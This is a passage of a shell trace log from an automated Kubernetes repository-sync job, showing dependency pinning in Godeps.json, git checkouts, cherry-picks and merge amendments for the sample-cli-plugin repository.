Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/sample-cli-plugin\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/cli-runtime/\") or . == \"k8s.io/cli-runtime\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/sample-cli-plugin/\") or . == \"k8s.io/sample-cli-plugin\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=b5382c347ee5349910d386a1be0785b735692d54\n>\t+ '[' -z b5382c347ee5349910d386a1be0785b735692d54 ']'\n>\t++ git-find-merge b5382c347ee5349910d386a1be0785b735692d54 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list 'b5382c347ee5349910d386a1be0785b735692d54^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list b5382c347ee5349910d386a1be0785b735692d54..upstream-branch --ancestry-path\n>\t+++ git rev-parse b5382c347ee5349910d386a1be0785b735692d54\n>\t+ local k_last_kube_merge=b5382c347ee5349910d386a1be0785b735692d54\n>\t+ local dep_count=4\n>\t+ (( i=0 ))\n>\t+ (( i<4 ))\n>\t+ local dep=api\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit b5382c347ee5349910d386a1be0785b735692d54.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit b5382c347ee5349910d386a1be0785b735692d54.\n>\t++ look -b b5382c347ee5349910d386a1be0785b735692d54 ../kube-commits-api-master\n>\t+ '[' -z d150a58332329a1cd3e80959b04f5487a8be7149 ']'\n>\t+ pushd ../api\n>\tChecking out k8s.io/api to d150a58332329a1cd3e80959b04f5487a8be7149\n>\t+ echo 'Checking out k8s.io/api to d150a58332329a1cd3e80959b04f5487a8be7149'\n>\t+ git checkout -q d150a58332329a1cd3e80959b04f5487a8be7149\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit b5382c347ee5349910d386a1be0785b735692d54.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit b5382c347ee5349910d386a1be0785b735692d54.\n>\t+ read k_commit dep_commit\n>\t++ look -b b5382c347ee5349910d386a1be0785b735692d54 ../kube-commits-apimachinery-master\n>\t+ '[' -z c6b66c9c507abbefa93ad83f7fe8c9b52ca1ae30 ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to c6b66c9c507abbefa93ad83f7fe8c9b52ca1ae30'\n>\t+ git checkout -q c6b66c9c507abbefa93ad83f7fe8c9b52ca1ae30\n>\tChecking out k8s.io/apimachinery to c6b66c9c507abbefa93ad83f7fe8c9b52ca1ae30\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=cli-runtime\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit b5382c347ee5349910d386a1be0785b735692d54.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit b5382c347ee5349910d386a1be0785b735692d54.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b b5382c347ee5349910d386a1be0785b735692d54 ../kube-commits-cli-runtime-master\n>\t+ '[' -z ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a ']'\n>\t+ pushd ../cli-runtime\n>\tChecking out k8s.io/cli-runtime to ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a\n>\t+ echo 'Checking out k8s.io/cli-runtime to ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a'\n>\t+ git checkout -q ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=client-go\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit b5382c347ee5349910d386a1be0785b735692d54.'\n>\tLooking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit b5382c347ee5349910d386a1be0785b735692d54.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b b5382c347ee5349910d386a1be0785b735692d54 ../kube-commits-client-go-master\n>\t+ '[' -z 31ff53b61673977656293edfa6a88503ed023037 ']'\n>\t+ pushd ../client-go\n>\tChecking out k8s.io/client-go to 31ff53b61673977656293edfa6a88503ed023037\n>\t+ echo 'Checking out k8s.io/client-go to 31ff53b61673977656293edfa6a88503ed023037'\n>\t+ git checkout -q 31ff53b61673977656293edfa6a88503ed023037\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' false = true ']'\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 1\n>\tCommitting vendor/ and Godeps/Godeps.json.\n>\t+ echo 'Committing vendor/ and Godeps/Godeps.json.'\n>\t+ git commit -q -m 'sync: update godeps'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 0b232ff14bc0b1626bc95be6787a57f454002aaf\n>\t+ '[' true = true ']'\n>\t+ echo 'Amending last merge with godep changes.'\n>\t+ git reset --soft -q 0b232ff14bc0b1626bc95be6787a57f454002aaf\n>\tAmending last merge with godep changes.\n>\t+ git commit -q --amend --allow-empty -C 0b232ff14bc0b1626bc95be6787a57f454002aaf\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ dst_merge_point_commit=d4bab9f3a28d21e720267a191179b6e993764ca7\n>\t+ k_pending_merge_commit=0698e4664325215b080eb7f73779b766b085b717\n>\t+ '[' 6486a043eb38c7909c0f07d5ce4f808dcb408964 = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ '[' master '!=' master ']'\n>\t+ '[' master '!=' master ']'\n>\t+ is-merge 6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\t++ git show --format=short -q 6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\t+ return 1\n>\t+ local pick_args=\n>\t+ is-merge 6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\t++ git show --format=short -q 6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\t+ return 1\n>\t++ commit-subject 6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\t++ git show --format=%s -q 6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\tCherry-picking k8s.io/kubernetes single-commit d5bbc35d4d0469d8915e9d5df56c8a92a3e3e9f4: make deps-approvers the approvers of sample-cli-plugin/Godeps.\n>\t+ echo 'Cherry-picking k8s.io/kubernetes single-commit d5bbc35d4d0469d8915e9d5df56c8a92a3e3e9f4: make deps-approvers the approvers of sample-cli-plugin/Godeps.'\n>\t+ local squash_commits=1\n>\t+ godep-changes 6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\t+ '[' -n '' ']'\n>\t+ git diff --exit-code --quiet '6486a043eb38c7909c0f07d5ce4f808dcb408964^' 6486a043eb38c7909c0f07d5ce4f808dcb408964 -- Godeps/Godeps.json\n>\t++ commit-date 6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\t++ git show --format=%aD -q 6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\t+ GIT_COMMITTER_DATE='Fri, 31 Aug 2018 15:56:28 -0700'\n>\t+ git cherry-pick --keep-redundant-commits 6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\t+ squash 1\n>\t++ git rev-parse HEAD\n>\t+ local head=06879834c97aaaf984cdada9f8b55ec293f6562f\n>\t+ git reset -q --soft HEAD~1\n>\t++ committer-date 06879834c97aaaf984cdada9f8b55ec293f6562f\n>\t++ git show --format=%cD -q 06879834c97aaaf984cdada9f8b55ec293f6562f\n>\t+ GIT_COMMITTER_DATE='Fri, 31 Aug 2018 15:56:28 -0700'\n>\t+ git commit --allow-empty -q -C 06879834c97aaaf984cdada9f8b55ec293f6562f\n>\t+ '[' -z 0698e4664325215b080eb7f73779b766b085b717 ']'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' 6d2426b8acccf110fe3fd0ca4efe115610cfec7d = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t++ kube-commit Kubernetes-commit 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ commit-message 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t++ git show --format=%B -q 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ k_mainline_commit=287f6a564fb8c264f281056011f4a66f197b18f4\n>\t++ git-find-merge 287f6a564fb8c264f281056011f4a66f197b18f4 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '287f6a564fb8c264f281056011f4a66f197b18f4^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 287f6a564fb8c264f281056011f4a66f197b18f4..upstream-branch --ancestry-path\n>\t+++ git rev-parse 287f6a564fb8c264f281056011f4a66f197b18f4\n>\t+ k_new_pending_merge_commit=7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t+ '[' 7b6647a418c660f2c87f183f706b297f1cb573ca = 287f6a564fb8c264f281056011f4a66f197b18f4 ']'\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n 0698e4664325215b080eb7f73779b766b085b717 ']'\n>\t+ '[' 7b6647a418c660f2c87f183f706b297f1cb573ca '!=' 0698e4664325215b080eb7f73779b766b085b717 ']'\n>\t+ local dst_parent2=HEAD\n>\t+ '[' master '!=' master ']'\n>\t++ commit-subject 0698e4664325215b080eb7f73779b766b085b717\n>\t++ git show --format=%s -q 0698e4664325215b080eb7f73779b766b085b717\n>\tCherry-picking source dropped-merge 0698e4664325215b080eb7f73779b766b085b717: Merge pull request #68154 from mikedanese/deps-approvers.\n>\t+ echo 'Cherry-picking source dropped-merge 0698e4664325215b080eb7f73779b766b085b717: Merge pull request #68154 from mikedanese/deps-approvers.'\n>\t++ commit-date 0698e4664325215b080eb7f73779b766b085b717\n>\t++ git show --format=%aD -q 0698e4664325215b080eb7f73779b766b085b717\n>\t+ local 'date=Sat, 1 Sep 2018 03:32:59 -0700'\n>\t+++ commit-message 0698e4664325215b080eb7f73779b766b085b717\n>\t+++ git show --format=%B -q 0698e4664325215b080eb7f73779b766b085b717\n>\t+++ echo\n>\t+++ echo 'Kubernetes-commit: 0698e4664325215b080eb7f73779b766b085b717'\n>\t++ GIT_COMMITTER_DATE='Sat, 1 Sep 2018 03:32:59 -0700'\n>\t++ GIT_AUTHOR_DATE='Sat, 1 Sep 2018 03:32:59 -0700'\n>\t++ git commit-tree -p d4bab9f3a28d21e720267a191179b6e993764ca7 -p HEAD -m 'Merge pull request #68154 from mikedanese/deps-approvers\n>\n>\tAutomatic merge from submit-queue (batch tested with PRs 67578, 68154, 68162, 65545). If you want to cherry-pick this change to another branch, please follow the instructions here: https://github.com/kubernetes/community/blob/master/contributors/devel/cherry-picks.md.\n>\n>\tmake deps-approvers the approvers of sample-cli-plugin/Godeps\n>\n>\t```release-note\r\n>\tNONE\r\n>\t```\n>\n>\tKubernetes-commit: 0698e4664325215b080eb7f73779b766b085b717' 'HEAD^{tree}'\n>\t+ local dst_new_merge=c32a9948d0e266221393925c2a8076e95d719439\n>\t+ git reset -q --hard c32a9948d0e266221393925c2a8076e95d719439\n>\t+ fix-godeps api:master,apimachinery:master,cli-runtime:master,client-go:master '' k8s.io false false true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=false\n>\t+ local squash=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=c32a9948d0e266221393925c2a8076e95d719439\n>\t+ '[' false = true ']'\n>\t+ '[' -f Godeps/Godeps.json ']'\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=0698e4664325215b080eb7f73779b766b085b717\n>\t+ '[' -z 0698e4664325215b080eb7f73779b766b085b717 ']'\n>\t++ git-find-merge 0698e4664325215b080eb7f73779b766b085b717 upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list '0698e4664325215b080eb7f73779b766b085b717^1..upstream-branch' --first-parent\n>\t+++ git rev-list 0698e4664325215b080eb7f73779b766b085b717..upstream-branch --ancestry-path\n>\t+++ git rev-parse 0698e4664325215b080eb7f73779b766b085b717\n>\t+ local k_last_kube_merge=0698e4664325215b080eb7f73779b766b085b717\n>\t+ local dep_count=4\n>\t+ (( i=0 ))\n>\t+ (( i<4 ))\n>\t+ local dep=api\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit 0698e4664325215b080eb7f73779b766b085b717.\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit 0698e4664325215b080eb7f73779b766b085b717.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 0698e4664325215b080eb7f73779b766b085b717 ../kube-commits-api-master\n>\t+ '[' -z fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1 ']'\n>\t+ pushd ../api\n>\tChecking out k8s.io/api to fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1\n>\t+ echo 'Checking out k8s.io/api to fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1'\n>\t+ git checkout -q fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 0698e4664325215b080eb7f73779b766b085b717.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 0698e4664325215b080eb7f73779b766b085b717.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 0698e4664325215b080eb7f73779b766b085b717 ../kube-commits-apimachinery-master\n>\tChecking out k8s.io/apimachinery to 9dc1de72c0f3996657ffc88895f89f3844d8cf01\n>\t+ '[' -z 9dc1de72c0f3996657ffc88895f89f3844d8cf01 ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to 9dc1de72c0f3996657ffc88895f89f3844d8cf01'\n>\t+ git checkout -q 9dc1de72c0f3996657ffc88895f89f3844d8cf01\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=cli-runtime\n>\tLooking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit 0698e4664325215b080eb7f73779b766b085b717.\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit 0698e4664325215b080eb7f73779b766b085b717.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 0698e4664325215b080eb7f73779b766b085b717 ../kube-commits-cli-runtime-master\n>\t+ '[' -z ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a ']'\n>\t+ pushd ../cli-runtime\n>\t+ echo 'Checking out k8s.io/cli-runtime to ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a'\n>\tChecking out k8s.io/cli-runtime to ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a\n>\t+ git checkout -q ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=client-go\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 0698e4664325215b080eb7f73779b766b085b717.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 0698e4664325215b080eb7f73779b766b085b717.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 0698e4664325215b080eb7f73779b766b085b717 ../kube-commits-client-go-master\n>\t+ '[' -z ec724c24d1d4c2d77654affa468ef156dfe19232 ']'\n>\t+ pushd ../client-go\n>\t+ echo 'Checking out k8s.io/client-go to ec724c24d1d4c2d77654affa468ef156dfe19232'\n>\tChecking out k8s.io/client-go to ec724c24d1d4c2d77654affa468ef156dfe19232\n>\t+ git checkout -q ec724c24d1d4c2d77654affa468ef156dfe19232\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ update-deps-in-godep-json api:master,apimachinery:master,cli-runtime:master,client-go:master k8s.io false Kubernetes-commit\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps_array=()\n>\t+ local deps_array\n>\t+ IFS=,\n>\t+ read -a deps_array\n>\t+ local dep_count=4\n>\t+ (( i=0 ))\n>\t+ (( i<4 ))\n>\t+ local dep=api\n>\t++ cd ../api\n>\t++ git rev-parse HEAD\n>\t+ local dep_commit=fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1\n>\t+ '[' -z fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1 ']'\n>\t++ jq -r '.Deps[] | select(.ImportPath | startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | .Rev' Godeps/Godeps.json\n>\t++ tail -n 1\n>\t+ local old_dep_commit=d150a58332329a1cd3e80959b04f5487a8be7149\n>\t+ '[' -n d150a58332329a1cd3e80959b04f5487a8be7149 ']'\n>\t+ '[' d150a58332329a1cd3e80959b04f5487a8be7149 '!=' fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1 ']'\n>\t+ echo 'Updating k8s.io/api dependency to fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1.'\n>\t+ sed -i s/d150a58332329a1cd3e80959b04f5487a8be7149/fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1/g Godeps/Godeps.json\n>\tUpdating k8s.io/api dependency to fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1.\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=apimachinery\n>\t++ cd ../apimachinery\n>\t++ git rev-parse HEAD\n>\t+ local dep_commit=9dc1de72c0f3996657ffc88895f89f3844d8cf01\n>\t+ '[' -z 9dc1de72c0f3996657ffc88895f89f3844d8cf01 ']'\n>\t++ jq -r '.Deps[] | select(.ImportPath | startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | .Rev' Godeps/Godeps.json\n>\t++ tail -n 1\n>\t+ local old_dep_commit=c6b66c9c507abbefa93ad83f7fe8c9b52ca1ae30\n>\t+ '[' -n c6b66c9c507abbefa93ad83f7fe8c9b52ca1ae30 ']'\n>\t+ '[' c6b66c9c507abbefa93ad83f7fe8c9b52ca1ae30 '!=' 9dc1de72c0f3996657ffc88895f89f3844d8cf01 ']'\n>\t+ echo 'Updating k8s.io/apimachinery dependency to 9dc1de72c0f3996657ffc88895f89f3844d8cf01.'\n>\tUpdating k8s.io/apimachinery dependency to 9dc1de72c0f3996657ffc88895f89f3844d8cf01.\n>\t+ sed -i s/c6b66c9c507abbefa93ad83f7fe8c9b52ca1ae30/9dc1de72c0f3996657ffc88895f89f3844d8cf01/g Godeps/Godeps.json\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=cli-runtime\n>\t++ cd ../cli-runtime\n>\t++ git rev-parse HEAD\n>\t+ local dep_commit=ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a\n>\t+ '[' -z ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a ']'\n>\t++ jq -r '.Deps[] | select(.ImportPath | startswith(\"k8s.io/cli-runtime/\") or . == \"k8s.io/cli-runtime\") | .Rev' Godeps/Godeps.json\n>\t++ tail -n 1\n>\t+ local old_dep_commit=ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a\n>\t+ '[' -n ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a ']'\n>\t+ '[' ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a '!=' ec3aaac11292b9c0beedb1c4594c0b1b1d43ef9a ']'\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=client-go\n>\t++ cd ../client-go\n>\t++ git rev-parse HEAD\n>\t+ local dep_commit=ec724c24d1d4c2d77654affa468ef156dfe19232\n>\t+ '[' -z ec724c24d1d4c2d77654affa468ef156dfe19232 ']'\n>\t++ jq -r '.Deps[] | select(.ImportPath | startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | .Rev' Godeps/Godeps.json\n>\t++ tail -n 1\n>\t+ local old_dep_commit=31ff53b61673977656293edfa6a88503ed023037\n>\t+ '[' -n 31ff53b61673977656293edfa6a88503ed023037 ']'\n>\t+ '[' 31ff53b61673977656293edfa6a88503ed023037 '!=' ec724c24d1d4c2d77654affa468ef156dfe19232 ']'\n>\t+ echo 'Updating k8s.io/client-go dependency to ec724c24d1d4c2d77654affa468ef156dfe19232.'\n>\tUpdating k8s.io/client-go dependency to ec724c24d1d4c2d77654affa468ef156dfe19232.\n>\t+ sed -i s/31ff53b61673977656293edfa6a88503ed023037/ec724c24d1d4c2d77654affa468ef156dfe19232/g Godeps/Godeps.json\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ indent-godeps\n>\t++ basename /go-workspace/src/k8s.io/sample-cli-plugin\n>\t+ unexpand --first-only --tabs=2\n>\t++ basename /go-workspace/src/k8s.io/sample-cli-plugin\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/sample-cli-plugin/\") or . == \"k8s.io/sample-cli-plugin\") | not))' Godeps/Godeps.json\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ git add Godeps/Godeps.json\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 1\n>\t+ echo 'Committing Godeps/Godeps.json.'\n>\t+ git commit -q -m 'sync: update godeps'\n>\tCommitting Godeps/Godeps.json.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code c32a9948d0e266221393925c2a8076e95d719439\n>\tAmending last merge with godep changes.\n>\t+ '[' true = true ']'\n>\t+ echo 'Amending last merge with godep changes.'\n>\t+ git reset --soft -q c32a9948d0e266221393925c2a8076e95d719439\n>\t+ git commit -q --amend --allow-empty -C c32a9948d0e266221393925c2a8076e95d719439\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ dst_merge_point_commit=449d505130128527e78e72633042a4c1dbbfcb06\n>\t+ k_pending_merge_commit=7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t+ 